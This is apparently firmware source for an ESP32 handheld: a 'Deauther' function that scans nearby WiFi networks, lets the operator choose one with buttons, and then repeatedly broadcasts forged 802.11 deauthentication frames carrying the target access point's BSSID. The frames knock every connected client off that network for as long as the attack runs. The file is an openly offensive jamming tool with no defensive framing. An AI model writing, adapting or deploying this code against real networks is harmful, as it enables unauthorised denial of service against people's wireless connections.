void Deauther() {
  showMessage("WiFi Deauther", "In development...");
  delay(2000);

  WiFi.mode(WIFI_STA);
  esp_wifi_start();

  int selectedNetwork = 0;
  int networkCount = 0;
  bool attacking = false;
  unsigned long lastDebounce = 0;
  const int debounceDelay = 200;

  // Scan inicial
  u8g2.clearBuffer();
  u8g2.setCursor(0, 30);
  u8g2.print("Scanning networks...");
  u8g2.sendBuffer();

  WiFi.scanDelete();
  networkCount = WiFi.scanNetworks(false, true); // passive=false, show_hidden=true

  if (networkCount <= 0) {
    u8g2.clearBuffer();
    u8g2.setCursor(0, 30);
    u8g2.print("No networks found");
    u8g2.sendBuffer();
    delay(1500);
    return;
  }

  // Loop principal
  while (!btnUp.isPressed()) {
    // Debounce básico para navegação
    if (millis() - lastDebounce > debounceDelay) {
      if (!attacking) {
        // Navegação
        if (btnRight.isPressed()) {
          selectedNetwork = (selectedNetwork + 1) % networkCount;
          lastDebounce = millis();
        } else if (btnLeft.isPressed()) {
          selectedNetwork = (selectedNetwork - 1 + networkCount) % networkCount;
          lastDebounce = millis();
        }

        // Exibe rede selecionada
        u8g2.clearBuffer();
        u8g2.setCursor(0, 10);
        u8g2.print("Select network:");
        u8g2.setCursor(0, 30);
        u8g2.print(WiFi.SSID(selectedNetwork));
        u8g2.setCursor(0, 50);
        u8g2.print("OK:BTN  Back:UP");
        u8g2.sendBuffer();

        // Inicia ataque
        if (btnOk.isPressed()) {
          attacking = true;

          // Definir canal do alvo (necessário para enviar pacotes 802.11)
          int targetChannel = WiFi.channel(selectedNetwork);
          esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
          delay(10); // pequenas pausas após trocar canal
        }
      } else {
        // Modo ataque: prepara o pacote de deautenticação
        uint8_t deauthPacket[26] = {
          0xC0, 0x00, 0x00, 0x00,             // Type/Subtype: Deauth
          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (substituir)
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (substituir)
          0x00, 0x00,                         // Sequence number (will incrementar)
          0x01, 0x00                          // Reason: Unspecified
        };

        // Copia BSSID (source + BSSID)
        const uint8_t* bssid = WiFi.BSSID(selectedNetwork);
        memcpy(&deauthPacket[10], bssid, 6);
        memcpy(&deauthPacket[16], bssid, 6);

        // Sequence control inicial
        uint16_t seq = 0;

        // Feedback visual
        u8g2.clearBuffer();
        u8g2.setCursor(0, 10);
        u8g2.print("Attacking:");
        u8g2.setCursor(0, 30);
        u8g2.print(WiFi.SSID(selectedNetwork));
        u8g2.setCursor(0, 50);
        u8g2.print("UP to stop");
        u8g2.sendBuffer();

        // Loop de envio até o operador parar
        while (!btnUp.isPressed()) {
          // Envia pacote múltiplas vezes por "rafaga"
          for (int i = 0; i < 10; i++) {
            // Atualiza sequence control (2 bytes)
            deauthPacket[22] = seq & 0xFF;
            deauthPacket[23] = (seq >> 8) & 0x0F; // 4 bits de fragment, 12 bits de seq -> truncado para segurança
            esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
            seq++;
            delay(2); // pequeno gap para processamento
          }

          // Pequeno refresh do display para responsividade
          u8g2.setCursor(80, 50);
          u8g2.print(millis() / 1000); // tempo de ataque em segundos
          u8g2.sendBuffer();

          // Permite cancelar pelo botão (debounce)
          if (btnUp.isPressed()) break;
        }

        // Parar ataque: restaura estado WiFi se quiser
        attacking = false;
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE); // opcional: volta para canal 1
        delay(100);
      }
    } // fim debounce
    delay(10); // loop-friendly
  } // fim while principal

  // Cleanup opcional
  esp_wifi_stop();
  WiFi.mode(WIFI_OFF);
  showMessage("Deauther", "Stopped");
  delay(800);
}
